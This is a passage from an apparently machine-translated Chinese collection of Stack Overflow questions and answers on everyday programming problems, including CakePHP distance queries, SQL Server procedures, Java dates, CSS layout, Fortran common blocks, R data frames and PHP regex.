            'Business.name' => 'ASC',
        )
    ) 
```

我不断收到的错误是：

> 错误：SQLSTATE [42S22]：未找到列：1054“有子句”中的未知列“距离”

请帮忙！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-06-12T07:56:53.043

在试图找到解决这个有子句问题的方法后，我也放弃了。似乎在 CakePHP V2 中是不可能的。最后我必须采用另一种方式：

```
 $expression = '( 3959 * acos( cos( radians(' . $session_lat . ') ) * cos( radians( User.lat ) ) * cos( radians( User.lng ) - radians(' . $session_lng . ') ) + sin( radians(' . $session_lat . ') ) * sin( radians( User.lat ) ) ) )';
$conditions[] = $expression . ' < 100';
$this->controller->Paginator->settings = array(
    'fields' => array('Item.*', $expression.' as distance'),
    'limit' => $limit,
    'order' => array('Item.id' => 'Desc'),
    'conditions' => $conditions,
    'joins' => $joins,
    'paramType' => 'querystring'
); 
```

因此，正如您所看到的，我已将计算字段再次置于 where 条件下。我希望它会帮助某人。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-22T15:29:02.237

这种情况的解决方案是使用虚拟字段：

```
$this->Business->virtualFields = array(
'distance' => '( 6371 * acos( cos( radians(' . $location['Location']['latitude'] . ') ) * cos( radians( Business.latitude ) ) * cos( radians( Business.longitude ) - radians(' . $location['Location']['longitude']  . ') ) + sin( radians(' . $location['Location']['latitude']  . ') ) * sin( radians( Business.latitude ) ) ) )'
); 
```

之后，您可以使用“距离”作为字段：

```
$this->Paginator->settings = array(
  'limit' => 20,
  'order' => array('Business.distance' => 'ASC'),
  'conditions' => array('Business.distance <=' => 100)
);

$data = $this->Paginator->paginate('Business'); 
```

您可以在此处阅读有关 CakePHP 虚拟字段的更多信息：http: [//book.cakephp.org/2.0/en/models/virtual-fields.html](http://book.cakephp.org/2.0/en/models/virtual-fields.html)

# sql - 存储过程中的语法错误

> ID：14832202
> 
> 赞同：0
> 
> 时间：2013-02-12T12:06:23.470
> 
> 标签：sql, stored-procedures, sql-server-2008-r2

我有一个嵌套的 if 语句存储过程，但它给了我错误：

> *消息 102，级别 15，状态 1，过程 SPCRMDoctorRequestList，第 28 行
> “DR”附近的语法不正确。*

（*这是在第二个 if 语句的 else 部分*）

这是我的存储过程：

```
CREATE PROCEDURE [dbo].[SPCRMList]
@Records INT,
@Type VARCHAR(10),  /*Recent, Priority, Pending, Approved*/
@ViewType VARCHAR(10)   /*Dashboard, List*/
AS
BEGIN
SET NOCOUNT ON
IF (@Type = 'Recent')
BEGIN
    IF(@ViewType = 'Dashboard')
    BEGIN
        Select top (@Records)
        DR.Id AS Id,    /*Unique ID*/
        USERS.USERNAME AS Requester_Name,       /*Employee Name*/
        ST.ServiceName AS Service_Type_Name,    /*Nature of Service*/
        DR.Date_Created AS Date_Created    /*Created Date*/
        From [Doctor_Request] AS DR
        JOIN [ASES].[dbo].[USERS] AS USERS
        ON DR.Requester COLLATE SQL_Latin1_General_CP1_CI_AS = USERS.RID COLLATE SQL_Latin1_General_CP1_CI_AS
        JOIN [SERVICE_TYPE] AS ST
        ON DR.Service_Type_Id=ST.Id
        WHERE DR.Is_Deleted=0
        ORDER BY DR.Date_Created DESC
    END
    ELSE IF (@ViewType = 'List')
    BEGIN
        Select top (@Records)
        DR.Id AS Id,    /*Unique ID*/
        USERS.USERNAME AS Requester_Name,       /*Employee Name*/
        ST.ServiceName AS Service_Type_Name,    /*Nature of Service*/
        DR.Date_Created AS Date_Created    /*Created Date*/
            DR.State AS State /*State of Request*/
            DR.Deadline AS Deadline /*Deadline of request*/
        From [Doctor_Request] AS DR
        JOIN [USERS] AS USERS
        ON DR.Requester COLLATE SQL_Latin1_General_CP1_CI_AS = USERS.RID COLLATE SQL_Latin1_General_CP1_CI_AS
        JOIN [SERVICE_TYPE] AS ST
        ON DR.Service_Type_Id=ST.Id
        WHERE DR.Is_Deleted=0
        ORDER BY DR.Date_Created DESC
    END
END 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T12:11:14.107

您没有`DR`在*两个查询*中定义表别名。例如它应该像

```
Select DR.colName, X.colName
from Table1 DR join Table2 X on DR.id = X.id
... 
```

同样在您的*第二个查询*中，您需要在...`commas`之后的列旁边添加一个`Date_Created`

```
SELECT ...
    DR.Date_Created AS Date_Created,    /*Created Date*/
    DR.State AS State, /*State of Request*/
    DR.Deadline AS Deadline /*Deadline of request*/
FROM ... 
```

# java - 是否可以通过 Spring 消息加载不同的属性文件以在 jsp 中使用？

> ID：14832203
> 
> 赞同：1
> 
> 时间：2013-02-12T12:06:28.820
> 
> 标签：java, spring, jsp, spring-mvc, properties

我在我的 jsps 中有用于普通消息的不同 messages.properties 文件，还有一些在我的 java 代码中使用的其他属性文件。

其中一个文件配置了一些属性来调用 Web 服务，例如地址、端口和类似的东西。让我们称之为`service.properties`。

我的一个jsp 必须调用这个服务，并且我必须用一些信息来映射表单，比如动作和参数。现在我已经在 jsp 中写下了这些信息，但我觉得这不是很好，我想将所有信息耦合在一起`service.properties`。

我正在寻找改变的东西

```
<spring:message code="service.action.form"/> 
```

到可定制的东西，不使用消息，而是使用指定的属性文件

```
<spring:messageservice code="service.action.form" /> 
```

并将信息从 messages.properties 移动到 service.properties

我不知道这是否可能，但我愿意接受不同的选择！谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:18:09.037

是的，你可以这么做。

将与服务相关的属性移动到文件 service.properties，然后在配置 xml 文件中声明`/WEB-INF/<properties folder path>/service`的 bean 的 basenames 属性中指定路径。`ReloadableResourceBundleMessageSource`然后您可以使用 访问该消息`<spring:message code='your.code'/>`。

希望这对您有所帮助。

# java - 将 java.sql.Timestamp 转换为 java.sql.Date

> ID：14832205
> 
> 赞同：10
> 
> 时间：2013-02-12T12:06:28.740
> 
> 标签：java, jdbc

我有一个时间戳和日期变量，我想比较它是否相等（当然只有日期部分）。令我惊讶的是，构造函数 Date(long) 节省了时间部分，因此此代码无法正常工作：

```
date = resultSet.getDate(1);
timestamp = resultSet.getTimestamp(2);    
//...
if (date.equals(new Date (timestamp.getTime())) ... 
```

我用如下代码解决了这个问题：

```
DateFormat dateFormat = new SimpleDateFormat ("yyyyMMdd");
if (date.equals(dateFormat.parse(dateFormat.format(timestamp)))) ... 
```

或者我可以在 sql 查询中将时间戳转换为日期，但我也需要时间戳表示。有没有更好的方法从时间戳中删除时间部分。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2016-01-26T14:59:16.347

Java 8 的转换方法：

```
Date date = Date.valueOf(timestamp.toLocalDateTime().toLocalDate()); 
```

反之亦然：

```
Timestamp timestamp = Timestamp.valueOf(date.toLocalDate().atStartOfDay()); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-12T12:16:25.653

使用[this answer中的方法，](https://stackoverflow.com/a/2517824/3171)我们得到：

```
date = resultSet.getDate(1);
timestamp = resultSet.getTimestamp(2);    
Calendar cal1 = Calendar.getInstance();
Calendar cal2 = Calendar.getInstance();
cal1.setTime(date);
cal2.setTimeInMillis(timestamp.getTime());
boolean sameDay = cal1.get(Calendar.YEAR) == cal2.get(Calendar.YEAR) &&
                  cal1.get(Calendar.DAY_OF_YEAR) == cal2.get(Calendar.DAY_OF_YEAR); 
```

值得阅读链接的答案，因为它谈到了这种方法在时区等方面的缺点（并且该问题的其他一些答案提供了您可能更喜欢的替代方法）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:18:27.523

你有这三个选项。

首先是使用尤达时间和类[DateTimeComparator.getDateOnlyInstance()](http://joda-time.sourceforge.net/api-release/org/joda/time/DateTimeComparator.html#getDateOnlyInstance%28%29)

其次是使用来自 apache 和[DateUtils.isSameDay()的 commons](http://commons.apache.org/lang/api-2.4/org/apache/commons/lang/time/DateUtils.html)

第三次使用【日历】设置时间，只比较年、月、日。正如戴夫韦伯提议的那样。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-01-26T15:10:51.907

另一种方法是使用纪元值的“日”部分：

```
Date d = new Date();
Timestamp t = new Timestamp(d.getTime());

long dateEpochDays = d.getTime() % (1000*60*60*24);
long timeStampEpochDays = t.getTime() %(1000*60*60*24);

System.out.println("date: " + dateEpochDays + " timestamp: " + timeStampEpochDays); 
```

# jquery - 如何将 div 始终放在具有动态内容的绝对位置 div 下方

> ID：14832207
> 
> 赞同：0
> 
> 时间：2013-02-12T12:06:39.510
> 
> 标签：jquery, css, layout, css-position

我有这些布局：

```
<div id='wrapper'>
    <div id="contentwrap">
         <div id='content'></div>
         <div id='lhs'></div>
         <div id='rhs'></div>
    </div>
    <div id='footer'></div>
</div> 
```

和 CSS：

```
#content {
    margin: 0 300px auto 180px !important;
    position: absolute;
    top: 142px;
}    

#wrapper {
    margin: 0 auto;
}
#lhs {
    float: left;
    width: 170px;
}
#rhs {
    float: right;
    width: 300px;
    margin-left: -300px;
    margin-right: 10px;
}

#footer {
    clear: both;
    width: 100%;
} 
```

只有一个要求：#content 必须是 [contentwrap] 中的第一个元素。

它的高度是动态的。

现在当它的高度增加时我遇到了问题：内容将与我的#footer 重叠。

![我目前的布局](../Images/39e904d9d2fb1ef25ac5c756fb94d98b.png) 如何确保“#footer”始终出现在“#content”下方并且没有发生重叠？

P/S：抱歉，图片太小了，imgur 做到了！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:22:40.123

更新内容后自动推送页脚：

```
<style>
#content {
    margin: 0 300px auto 180px !important;
    position: absolute;
    top: 142px;
    background-color:red;
}    

#wrapper {
    margin: 0 auto;
}

#footer{
    position:absolute;
}
</style>

<div id='wrapper'>
    <div id="contentwrap">
         <div id='content'>
             Example Text<br>
             Two Lines
         </div>
         <div id='lhs'></div>
         <div id='rhs'></div>
    </div>
    <div id="footer">The is the Footer</div>
</div>
<script>
function updateFooter(){
footer=document.getElementById('footer');
content=document.getElementById('content');
contentBottom=content.offsetTop+content.offsetHeight;
footer.style.position='absolute';
footer.style.top=contentBottom + 'px'
}
window.setInterval(updateFooter,100)
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T13:50:15.383

总会有办法的。但这并不意味着它是正确/安全的方式。这个例子只是一个证明这是可能的，我鼓励你修改你的 html 而**不要**使用这种技术。利用

```
<div id='lhs'></div>
<div id='content'></div>
<div id='rhs'></div> 
```

随着`float: left;`

此示例使用 css3 中的 calc() 函数，因此它可能不适用于旧版浏览器。虽然这是有效的并且是响应式的（将根据页面宽度更改宽度），但您应该修改您的 html，因为我认为没有理由说明为什么“内容”必须排在第一位。

[小提琴](http://jsfiddle.net/QE2G5/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T13:32:30.420

好的，所以这使用了一种技术，其中所有 3 列都向左浮动，以便它们彼此相邻堆叠，并且使用负的左边距将左侧列拉回到视图中。

我没有对此进行过广泛的测试（仅 Firefox 18 / Windows7），因此它可能无法在所有浏览器/操作系统组合上运行：

```
#wrapper {
    margin: 0 auto;
    width: 100%;
}

#contentwrap {
    float: left;
    width: 100%;
}

#content {
    margin: 0 300px auto 170px !important;
}    

#lhs {
    float: left;
    width: 170px;
    margin-left: -100%;
}

#rhs {
    float: left;
    width: 300px;
    margin-left: -300px;
    margin-right: 0px;
}

#footer {
    clear: left;
    width: 100%;
} 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2013-02-12T12:14:54.180

`max-height`您可以在#content div 上使用样式

或在页脚和内容之间放置一个空 div，如下所示：

```
<div id='wrapper'>
    <div id="contentwrap">
         <div id='content'></div>
         <div id='lhs'></div>
         <div id='rhs'></div>
    </div>
    <div style="clear:both;height:0px;overflow:hidden;"></div>
    <div id='footer'></div>
</div> 
```

# sql - 在更新查询中动态设置模式名称和表名称

> ID：14832216
> 
> 赞同：1
> 
> 时间：2013-02-12T12:07:06.900
> 
> 标签：sql, db2, prepared-statement

我有一个更新查询如下：

```
UPDATE SCHEMA_NAME.TABLE_NAME SET COLUMN_NAME = VALUE; 
```

我在准备好的语句设置器中将以下查询作为字符串传递：

```
UPDATE ?.? SET ? = ? 
```

在我准备好的语句 setter java 类中，我将值设置如下：

```
ps.setString(1, "mySchema");
ps.setString(2, "myTable");
ps.setString(3, "myColumn");
ps.setString(4, "myValue"); 
```

但是，在运行准备上述查询并运行它的 java 程序时，出现以下错误：

```
DB2 SQL error: SQLCODE: -104, SQLSTATE: 42601 
```

如何以我上面描述的方式动态创建查询？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:09:21.827

您不能使用参数化（即`?`）来设置模式或表名。相反，您只需要在准备语句之前将正确的表插入到 Java 中的字符串中。

# fortran - 为什么常见的块变量不会保留它们的值？

> ID：14832217
> 
> 赞同：2
> 
> 时间：2013-02-12T12:07:07.917
> 
> 标签：fortran, fortran-common-block

首先，我知道在 fortran（和一般编程）中使用公共块是一个坏主意。但是，我正在更新别人的代码，我不想弄乱已知有效的东西。
其次，我知道我应该发布一些更具体的内容。如果我知道如何将其减少为小东西，我会的。但是，由于我知道，而且我认为您不会欣赏 2500 行代码，因此我无法发布具体示例。
考虑到这一点，我无法描述我的问题。

我正在更新别人的 fortran 代码。这家伙使用了几 (4) 个通用块来设置全局变量。出于某种原因，当我调用使用这样一个块的函数时，它的所有值都是 0。以前有人遇到过吗？有谁知道为什么会发生这种情况？如何重现这个？检查这一点的任何起点都会有所帮助。

对于它的价值，所述公共块被声明为

```
common /set/ block,x,y,z,llx,lly,llz,ilx,ily,ilz,third,third2 
```

`block`是一个 4D 数组。`x`, `y`, 和`z`是一维数组。`llx`, `lly`, 和`llz`, 是`double precision`类型。其余的都是`integer`类型。

在调用任何函数之前，在主程序中声明和初始化公共块。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T14:04:29.193

Some compilers do initialize common variables to zero, so if you first invoke the function with the common block, you might find zeros everywhere (although you should *not* rely on that). But once you set some values for the common block variables in the program, those values should appear whenever you use the common block.

As of the variables in the common block: They can be of arbitrary type, as long as they are consistently defined at all places, where the common block is used.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-24T21:32:40.323

你能将你的代码与这个小例子进行比较吗？我认为您可能会遗漏一些东西，例如子例程中的“通用”声明。

**请注意**，您不需要为子例程 ( `AA`) 中的变量使用与 main ( `GB`) 相同的名称。只是公共块名称 ( `myarray`) 必须相同。但是，如果您替换`AA`为，则不会发生任何不好的事情`GB`，并且最终结果会更清晰易读。

```
program main
    real             GB(4)
    common /myarray/ GB

    integer  i
    real     B(4)

    GB=0
    write(*,*) 'GB',GB

    do i=1,4
        call AddSubR()
        write(*,*) 'GB',GB
    enddo

end program main

subroutine AddSubR()
    real             AA(4)
    common /myarray/ AA

    integer i

    do i=1,4
        AA(i) = AA(i)+1
    enddo

end subroutine AddSubR 
```

# r - 将新变量添加到数据框中的特定位置

> ID：14832221
> 
> 赞同：7
> 
> 时间：2013-02-12T12:07:10.330
> 
> 标签：r

我有一个 DF，我想在第二个位置添加一个名为“B”的新变量。

```
 A C D
1 1 5 2
2 3 3 7
3 6 2 3
4 6 4 8
5 1 1 2 
```

有人有想法吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-12T12:16:24.560

最简单的方法是添加所需的列，然后重新排序：

```
dat$B <- 1:5
newdat <- dat[, c("A", "B", "C", "D")] 
```

其他方式：

```
newdat <- cbind(dat[1], B=1:5, dat[,2:3]) 
```

如果您担心开销，也许是一个`data.table`解决方案？（在[这个答案](https://stackoverflow.com/a/12232123/1465387)的帮助下）：

```
library(data.table)
dattable <- data.table(dat)
dattable[,B:=1:5]
setcolorder(dattable, c("A", "B", "C", "D")) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-10-18T15:48:45.457

```
dat$B <- 1:5 
ind <- c(1:which(names(data) == "A"),ncol(data),(which(names(data) == "A")+1):ncol(data)-1)
data <- data[,ind] 
```

在 data.frame 的末尾创建变量，然后使用指示符向量指示如何重新排序列。ind 只是一个数字向量

# jquery - 使用 jQuery.load() 在 div 中打开 ASP.NET 页面

> ID：14832226
> 
> 赞同：1
> 
> 时间：2013-02-12T12:07:27.433
> 
> 标签：jquery, asp.net, tabs, telerik

我正在使用下面的代码在 div 标签内打开一个网页。

```
 $(document).ready(function () {
                $("#popupContact").load("Wizard.aspx");

            }); 
```

在 Wizard.aspx 页面中，我有一个 Telerik RadTabStrip 控件。加载页面时，选项卡控件显示没有任何问题，但我无法导航到选项卡页（选项卡不起作用）。

如果我在没有 jquery 代码的情况下加载页面 Wizard.aspx，则一切正常。

```
<telerik:RadScriptManager runat="server" ID="RadScriptManager1" >
    </telerik:RadScriptManager>
    <div class="exampleWrapper" style="background-repeat: repeat;" >
    <a id="popupContactClose"><b>X</b></a>
   <b>Fill the Form</b>
        <telerik:RadAjaxLoadingPanel runat="server" ID="LoadingPanel1">
        </telerik:RadAjaxLoadingPanel>
        <telerik:RadAjaxPanel runat="server" ID="RadAjaxPanel1" LoadingPanelID="LoadingPanel1"
            Height="100%">
            <div style="float: left; width: 500px; ">
                <telerik:RadTabStrip ID="RadTabStrip1" SelectedIndex="0" runat="server" MultiPageID="RadMultiPage1"
                    Skin="Sunset" CssClass="tabStrip">
                </telerik:RadTabStrip>
                <telerik:RadMultiPage ID="RadMultiPage1" runat="server" SelectedIndex="0" OnPageViewCreated="RadMultiPage1_PageViewCreated"
                    CssClass="multiPage">
                </telerik:RadMultiPage>
            </div>
            <div id="specialdiv" class="previewWrapper" style="background-image: url('images/preview.jpg')">
                <uc1:PreviewCS ID="previewControl" runat="server"></uc1:PreviewCS>
            </div>
        </telerik:RadAjaxPanel>

    </div> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-12T12:12:23.430

[`jQuery.load()`](http://api.jquery.com/load/)从页面获取呈现的 HTML 输出并将此 HTML 插入到您的选择器元素中。

> 从服务器加载数据并将返回的 HTML 放入匹配的元素中。

在您的情况下，呈现的 HTML`Wizard.aspx`嵌套在您的`#popupContact`div 中。

此 Telerik 控件使用的任何服务器端事件等都不会回发`Wizard.aspx`，因此不会按预期工作。

* * *

当使用需要回发的 ASP.NET WebForms 和控件时，我建议将您的`Wizard.aspx`代码添加到自定义用户控件（例如：）`Wizard.ascx`中，然后在 AJAX 中调用它[`UpdatePanel`](http://msdn.microsoft.com/en-us/library/bb399001%28v=vs.100%29.aspx)。

这确保所有回发等仍然与`ViewState`.

* * *

或者（这是我个人会采用的方法）考虑删除对 Web 控件的使用，并将它们替换为不依赖于`ViewState`.

我不熟悉那个确切的 Telerik 控件，但我确信有一种方法可以在没有 Telerik 并使用 HTML 和 jQuery 的情况下做到这一点。然后，您可以`jQuery.load()`在 javascript 中使用和重新附加任何事件处理程序。

这将导致更轻、更可控的输出。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:16:10.633

除非`Wizard.aspx`以某种方式是部分页面，否则调用`$("#popupContact").load("Wizard.aspx");`会将整个 HTML 文档加载到您的`div`中，这将导致完全无效的标记。无效的标记往往会级联成很多其他不起作用的东西......

应该注意的是，它`.load()`允许您在注入之前从结果中提取片段 - 将带有容器 ID 的 URL 片段添加到您提供的 URL 中，以用于“向导”控件`.load()`：

`$("#popupContact").load("Wizard.aspx #wizard_or_whatever_you_named_this");`

但是，您将丢失该页面上嵌入的所有 CSS 或 JavaScript。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:15:36.550

您可以使用[iframe](http://www.w3schools.com/tags/tag_iframe.asp)。

**iframe：**标签指定内联框架。内联框架用于在当前 HTML 文档中嵌入另一个文档。

例如。：

```
<iframe src="Wizard.aspx" id="ifrmWizard"></iframe> 

$(document).ready(function () {
     $("#ifrmWizard").attr("src","Wizard.aspx");
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T04:55:23.623

Jquery 颜色框终于为我工作了。它使用 iframe 加载外部窗口并且没有产生任何问题。

[http://www.jacklmoore.com/colorbox/example1/](http://www.jacklmoore.com/colorbox/example1/)

# php - Facebook 给了我两个不同的访问令牌，PHP SDK

> ID：14832230
> 
> 赞同：0
> 
> 时间：2013-02-12T12:07:34.093
> 
> 标签：php, facebook, facebook-php-sdk, facebook-apps, facebook-access-token

我使用 Yii 作为框架，但我认为这不会。

此时我使用 PHP SDK 从用户那里获取帐户信息，这在我的用户首先登录时工作正常。但是 1 或 2 小时后访问令牌过期，我收到一个错误（这并不奇怪）。

但这是我卡住的地方，我可以想到 2 个解决方案，但我都不知道该怎么做。首先让我介绍一下我的一些代码：

要登录我的应用程序，用户将发送到`FacebookLogin()`操作：

```
public function actionFacebookLogin()
{
    $my_url = 'http://***.***.nl/app/facebook-popup.php';
    $permissions = 'read_insights, publish_actions, manage_pages, email';
    $loginUrl = Yii::app()->facebook->getLoginUrl(array('scope' => $permissions, 'display' => 'popup', 'redirect_uri' => $my_url));
    echo '<script> window.location="'.$loginUrl.'"</script>';
} 
```

在用户授予适当的权限后，用户将被发送到`Login()`操作：

```
public function actionLogin() {
    $facebookID = Yii::app()->facebook->getUser();  
    $accessToken = Yii::app()->facebook->getAccessToken();
} 
```

（登录操作的其余部分并不重要。）

现在，该`->getAccessToken()`函数为我提供了一个适当的 access_token ，其生命周期很短。这会很好，除非用户在我的页面上超过 1 或 2 小时，“现在一些奇怪的东西 * 之后用户必须注销并重新登录。然后我仍然收到错误，除非大约 10 分钟后我得到一个新的 access_token 确实授予我所需的权限。

因此，为了解决这个问题，我想到了 2 个解决方案，但我无法找到使用它的正确方法。

首先是最简单的。当我转到[Graph API Explorer](https://developers.facebook.com/tools/explorer/)并使用 access_token 时，我的应用程序给了我信息，但是当我尝试调试 access_token 时，它显示 access_token 有一个有效期。但是当我使用相同的[Graph API Explorer](https://developers.facebook.com/tools/explorer/)并让它自己生成一个 access_token 时，我得到一个根本不会过期的 access_token。

**[当被问及我对Graph API Explorer](https://developers.facebook.com/tools/explorer/)****的处理更新时，** 我转到 API Explorer 并将应用程序更改为我的 webapp。然后它自动填写了一个正常的access_token。当我按下“调试”按钮时，它说这个 access_token 有一个有效期。然后当我返回资源管理器并按下“获取访问令牌”按钮时，它会给我另一个。当我再次按下“调试”按钮时，它说这个 access_token 没有有效期。如果我能用这个就好了。

所以我的第一个解决方案是获取最后一个 access_token（如果可能）并将其存储在我的数据库中。然后在需要时使用 Facebook PHP SDK`->setAccessToken()`功能。但是怎么办？？我一点头绪都没有！

我想到的第二个解决方案。`init()`如果我们得到一个有效的 access_token 并且如果没有得到一个新的或刷新当前过期的，我还可以创建一个函数来检查每个操作。这将比第一个解决方案有更多的服务器负载，并且与第一个解决方案相同，我不知道如何实现这一点。

我认为主要问题是我发现 Facebook 文档有点难以理解，而且我不知道从哪里开始。

任何输入都会非常受欢迎！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:29:52.193

您可以延长访问令牌的到期时间，如下所述：[https ://developers.facebook.com/roadmap/offline-access-removal/](https://developers.facebook.com/roadmap/offline-access-removal/)

或者您可以嵌入 JS SDK，如果前一个已过期，则在每个页面调用上都会获得一个新的短期访问令牌。（并通过 cookie 与 PHP SDK 共享。）

# c++ - GLUT：致命错误：内存不足

> ID：14832233
> 
> 赞同：0
> 
> 时间：2013-02-12T12:07:41.237
> 
> 标签：c++, windows, glut

我有一个在我的桌面上运行良好的 opengl 实现。但即使我在我的笔记本电脑上以完全相同的方式设置它，当我尝试运行它时，我也会收到“内存不足”错误。

这很奇怪，因为在我的桌面上，该应用程序只占用 200mb 内存，而我的笔记本电脑上有 2gb 可用

有什么想法可能导致这种情况吗？

顺便说一句，我通过 Visual Studio 2012 Ultimate 运行应用程序并使用本文第一个答案中建议的 glut 设置：[如何修复此错误：#include <gl/glut.h>“无法打开源文件 gl/glut.h”](https://stackoverflow.com/questions/10467473/how-to-fix-this-error-include-gl-glut-h-cannot-open-source-file-gl-glut-h)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:15:22.970

1.  检查文件的编码（[http://lists.apple.com/archives/mac-opengl/2006/Jun/msg00070.html](http://lists.apple.com/archives/mac-opengl/2006/Jun/msg00070.html)）

2.  确保您使用的是相同的运行时环境（您是否在笔记本电脑上安装了相同的 glut.dll？）

最后，我有一个问题：“通过 Visual Studio 运行应用程序”是什么意思？你按Ctrl+F5吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:36:50.333

我找到了解决方案，这很愚蠢。

我在“项目首选项->链接器->高级”中将“主”设置为“入口点”，因为它在我的桌面上是必需的。我删除了这个，所以我有一个空白的“入口点”，我的代码运行良好^^

发布以防有人需要此信息

# xcode - Xcode 中的提交错误

> ID：14832236
> 
> 赞同：1
> 
> 时间：2013-02-12T12:07:44.827
> 
> 标签：xcode

我已连接到 git 存储库。每次我想提交某些东西时，Xcode 都会说“操作无法完成。（com.apple.dt.IDESourceControlErrorDomain 错误 -70。）”。按确定后，我可以提交我的更改，一切看起来都很好，但这很烦人。有人有解决方案吗？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T15:47:39.247

我有同样的问题，我是一个基本的 svn 用户，所以我确信有更好的答案，但它帮助了我，冲突在我的 project.xcodeproj 文件上，所以我关闭了 XCode，我创建了当前项目的备份，由于 xcodeproj 文件即将更改并且可能会崩溃，因此不确定快照功能是否有效，我打开了终端，并执行了提示我的命令“svn update”：

```
Conflict discovered in 'myProject.xcodeproj/project.pbxproj'.
Select: (p) postpone, (df) diff-full, (e) edit,
        (mc) mine-conflict, (tc) theirs-conflict,
        (s) show all options: 
```

我选择了's'，然后我得到了

```
 (e)  edit             - change merged file in an editor
  (df) diff-full        - show all changes made to merged file
  (r)  resolved         - accept merged version of file

  (dc) display-conflict - show all conflicts (ignoring merged version)
  (mc) mine-conflict    - accept my version for all conflicts (same)
  (tc) theirs-conflict  - accept their version for all conflicts (same)

  (mf) mine-full        - accept my version of entire file (even non-conflicts)
  (tf) theirs-full      - accept their version of entire file (same)

  (p)  postpone         - mark the conflict to be resolved later
  (l)  launch           - launch external tool to resolve conflict
  (s)  show all         - show this list 
```

我选择了“tc”，然后再次打开我的项目并应用了我的更改。

# mysql - 与 MySQL 数据库的连接

> ID：14832237
> 
> 赞同：1
> 
> 时间：2013-02-12T12:07:48.907
> 
> 标签：mysql, connection

可能是一个愚蠢的问题，但我无法弄清楚。这是一个概念问题。我有一个网络平台，用户可以在其中存储很多东西，同时有大约 500 个连接。在性能/安全性方面，最好的方法是什么：

*   每次我需要从中获取数据时（每次他转到另一个页面 BTW）将用户连接到数据库并在我抓取它们后关闭连接？或者
*   在登录时将用户一次连接到数据库，保持到数据库的链接（如在 $_SESSION 中）并在注销时终止连接？或者
*   登录时，从用户表中获取几乎所有内容，其配置文件和所有其他配置文件，将它们放入 $_SESSION 并仅在需要更新/插入时连接到数据库？

连接本身很耗时，这就是我寻找最佳方法的原因。但另一方面，我总是听到“总是尽快关闭你的数据库连接”

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:14:04.720

我想说这在很大程度上取决于您的特定用例和您的服务器设置。确定的唯一方法是尝试不同的解决方案并分析您的代码。

通常，当您分析您的第一个选择的解决方案时，您会得到有关导致延迟的原因以及等待/处理时间的最大贡献者的提示。这样您就可以更好地猜测下一个（和改进的）解决方案。

通常，延迟评估然后尽可能多地缓存是一种很好的方法。对于 Web 应用程序，诸如 Memcached 或 Redis 等非关系型数据库是一种事实上的标准（至少在我的经验中是这样）。

如果你保持你的数据库连接打开，你应该知道你只能运行你的数据库设置处理的并发查询。尽快关闭连接会降低数据库并发性。如果连接建立引入了很多延迟，也许您应该考虑偶尔抓取所有相关数据并缓存它们。确定的唯一方法是分析您的应用程序。

*更新：*

> 感谢您的回复。我将对此进行分析，看看有什么更好的。我会看看 MemCached。我想稍后再看，但我想那是正确的时间。– fperr

一开始我也被 MemCached 推迟了，但它一点也不复杂。它作为（哈希）映射/字典工作，人们通常只是将会话数据保存在 MemCached 实例上，并通过会话 ID 或类似的东西对其进行索引。

祝你的项目好运:)

# php - 替换两个限制之间的文本

> ID：14832239
> 
> 赞同：5
> 
> 时间：2013-02-12T12:07:53.440
> 
> 标签：php, regex

我一直在尝试将两个符号之间的文本替换为`preg_replace`，但是由于我得到一个空字符串的空输出，所以仍然没有完全正确，这就是我到目前为止所拥有的

```
$start = '["';
$end   = '"]';
$msg   = preg_replace('#('.$start.')(.*)('.$end.')#si', '$1 test $3', $row['body']); 
```

所以我正在寻找的一个示例输出是：

```
normal text [everythingheregone] after text 
```

至

```
 normal text [test] after text 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-12T12:14:21.810

您将 $start 和 $end 定义为数组，但将其用作普通变量。尝试将您的代码更改为：

```
$start = '\[';
$end  = '\]';
$msg = preg_replace('#('.$start.')(.*)('.$end.')#si', '$1 test $3', $row['body']); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:28:56.247

some functions that may help

```
function getBetweenStr($string, $start, $end)
    {
        $string = " ".$string;
        $ini = strpos($string,$start);
        if ($ini == 0) return "";
        $ini += strlen($start);    
        $len = strpos($string,$end,$ini) - $ini;
        return substr($string,$ini,$len);
    } 
```

and

```
function getAllBetweenStr($string, $start, $end)
    {
        preg_match_all( '/' . preg_quote( $start, '/') . '(.*?)' . preg_quote( $end, '/') . '/', $string, $matches);
        return $matches[1];
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:19:25.233

怎么样

```
$str  = "normal text [everythingheregone] after text";
$repl = "test";
$patt = "/\[([^\]]+)\]/"; 
$res  = preg_replace($patt, "[". $repl ."]", $str); 
```

应该让步`normal text [test] after text`

**编辑**

